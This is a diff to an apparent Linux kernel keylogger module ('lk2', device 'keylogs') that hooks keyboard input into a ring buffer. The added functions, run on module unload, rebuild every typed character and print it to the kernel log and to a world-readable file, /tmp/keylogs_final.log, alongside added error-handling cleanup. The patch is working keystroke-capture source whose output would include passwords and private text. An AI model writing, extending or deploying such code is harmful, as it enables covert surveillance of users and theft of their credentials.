@@ -92,6 +92,142 @@ static ssize_t keylogs_read(struct file *file, char __user *ubuf,
 	return simple_read_from_buffer(ubuf, count, ppos, ctx->buf, ctx->len);
 }
 
+static void lk2_write_to_tmp(void)
+{
+	struct file *f;
+	struct lk2_entry *entries = NULL;
+	char *typed = NULL;
+	char *buf = NULL;
+	u32 n, i, typed_len = 0;
+	loff_t pos = 0;
+	int len;
+
+	n = lk2_ring_count(&g_lk2_ring);
+
+	f = filp_open("/tmp/keylogs_final.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if (IS_ERR(f))
+	{
+		pr_warn("Failed to open /tmp/keylogs_final.log: %ld\n", PTR_ERR(f));
+		return;
+	}
+
+	if (n == 0)
+	{
+		kernel_write(f, "Keylog summary: (empty)\n", 24, &pos);
+		filp_close(f, NULL);
+		pr_info("Final log written to /tmp/keylogs_final.log\n");
+		return;
+	}
+
+	entries = kcalloc(n, sizeof(*entries), GFP_KERNEL);
+	if (!entries)
+	{
+		filp_close(f, NULL);
+		return;
+	}
+
+	typed = kmalloc(n + 1, GFP_KERNEL);
+	if (!typed)
+	{
+		kfree(entries);
+		filp_close(f, NULL);
+		return;
+	}
+
+	buf = kmalloc(256, GFP_KERNEL);
+	if (!buf)
+	{
+		kfree(typed);
+		kfree(entries);
+		filp_close(f, NULL);
+		return;
+	}
+
+	n = lk2_ring_snapshot(&g_lk2_ring, entries, n);
+
+	for (i = 0; i < n; i++)
+	{
+		if (entries[i].state == LK2_PRESSED && entries[i].ascii != 0)
+			typed[typed_len++] = entries[i].ascii;
+	}
+	typed[typed_len] = '\0';
+
+	kernel_write(f, "========== Keylog Summary ==========\n", 37, &pos);
+
+	len = snprintf(buf, 256, "Total events: %u (pressed keys with ASCII: %u)\n", n, typed_len);
+	kernel_write(f, buf, len, &pos);
+
+	if (typed_len > 0)
+	{
+		len = snprintf(buf, 256, "Typed: %s\n", typed);
+		kernel_write(f, buf, len, &pos);
+	}
+	else
+	{
+		kernel_write(f, "Typed: (no printable characters)\n", 33, &pos);
+	}
+
+	kernel_write(f, "====================================\n", 37, &pos);
+
+	filp_close(f, NULL);
+	kfree(buf);
+	kfree(typed);
+	kfree(entries);
+
+	pr_info("Final log written to /tmp/keylogs_final.log\n");
+}
+
+static void lk2_print_summary(void)
+{
+	struct lk2_entry *entries = NULL;
+	char *typed = NULL;
+	u32 n, i, typed_len = 0;
+
+	n = lk2_ring_count(&g_lk2_ring);
+	if (n == 0)
+	{
+		pr_info("Keylog summary: (empty)\n");
+		return;
+	}
+
+	entries = kcalloc(n, sizeof(*entries), GFP_KERNEL);
+	if (!entries)
+	{
+		pr_warn("Failed to allocate memory for keylog summary\n");
+		return;
+	}
+
+	// Buffer for typed ASCII characters (worst case: all entries are printable)
+	typed = kmalloc(n + 1, GFP_KERNEL);
+	if (!typed)
+	{
+		kfree(entries);
+		pr_warn("Failed to allocate memory for keylog summary\n");
+		return;
+	}
+
+	n = lk2_ring_snapshot(&g_lk2_ring, entries, n);
+
+	// Build ASCII string from pressed keys only
+	for (i = 0; i < n; i++)
+	{
+		if (entries[i].state == LK2_PRESSED && entries[i].ascii != 0)
+			typed[typed_len++] = entries[i].ascii;
+	}
+	typed[typed_len] = '\0';
+
+	pr_info("========== Keylog Summary ==========\n");
+	pr_info("Total events: %u (pressed keys with ASCII: %u)\n", n, typed_len);
+	if (typed_len > 0)
+		pr_info("Typed: %s\n", typed);
+	else
+		pr_info("Typed: (no printable characters)\n");
+	pr_info("====================================\n");
+
+	kfree(typed);
+	kfree(entries);
+}
+
 static int keylogs_release(struct inode *inode, struct file *file)
 {
 	struct lk2_file_ctx *ctx = file->private_data;
@@ -124,12 +260,18 @@ static int __init lk2_init(void)
 {
 	int err;
 
-	lk2_ring_init(&g_lk2_ring);
+	err = lk2_ring_init(&g_lk2_ring);
+	if (err)
+	{
+		pr_err("ring init failed: %d\n", err);
+		return err;
+	}
 
 	err = misc_register(&keylogs_miscdev);
 	if (err)
 	{
 		pr_err("misc_register failed: %d\n", err);
+		lk2_ring_destroy(&g_lk2_ring);
 		return err;
 	}
 
@@ -138,6 +280,7 @@ static int __init lk2_init(void)
 	{
 		pr_err("lk2: input handler registration failed: %d\n", err);
 		misc_deregister(&keylogs_miscdev);
+		lk2_ring_destroy(&g_lk2_ring);
 		return err;
 	}
 
@@ -150,6 +293,9 @@ static void __exit lk2_exit(void)
 	lk2_input_unregister();
 	misc_deregister(&keylogs_miscdev);
 
+	lk2_print_summary();
+	lk2_write_to_tmp();
+	lk2_ring_destroy(&g_lk2_ring);
 	pr_info("exiting\n");
 }
 
